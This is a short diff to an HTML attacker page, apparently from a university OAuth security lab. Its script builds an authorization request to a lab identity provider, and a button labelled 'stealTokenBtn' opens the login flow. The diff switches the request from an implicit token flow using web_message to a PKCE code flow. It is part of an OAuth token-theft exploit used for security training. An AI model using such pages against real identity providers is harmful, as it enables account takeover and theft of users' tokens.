@@ -32,14 +32,15 @@
     <script>
         // Target OAuth authorization URL (modify accordingly)
         const authorizeUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml
-        ?client_id=spa-1
-        &redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify
-        &response_mode=web_message
-        &scope=profile+email+calendar+passwords+photos
-        &response_type=token
-        &state=123456789
-        &skip_prompt=1
-        &idp_verifier=spa-a5`.replace(/\s+/g, '');
+      ?scope=profile+email+calendar+passwords+photos
+      &response_type=code
+      &redirect_uri=https%3A%2F%2Fsp%2Delearning%2Ecloud%2Ends%2Erub%2Ede%3A443%2Foidc%5Fsp%2Fspa%2Fverify
+      &state=27ef0580-b028-4b24-94e5-c643f141fbbf
+      &code_challenge_method=S256
+      &client_id=spa-1
+      &code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0
+      &response_mode=query
+      &idp_verifier=spa-s1`.replace(/\s+/g, '');
 
         // Open OAuth login flow in a new window
         document.getElementById("stealTokenBtn").addEventListener("click", () => {
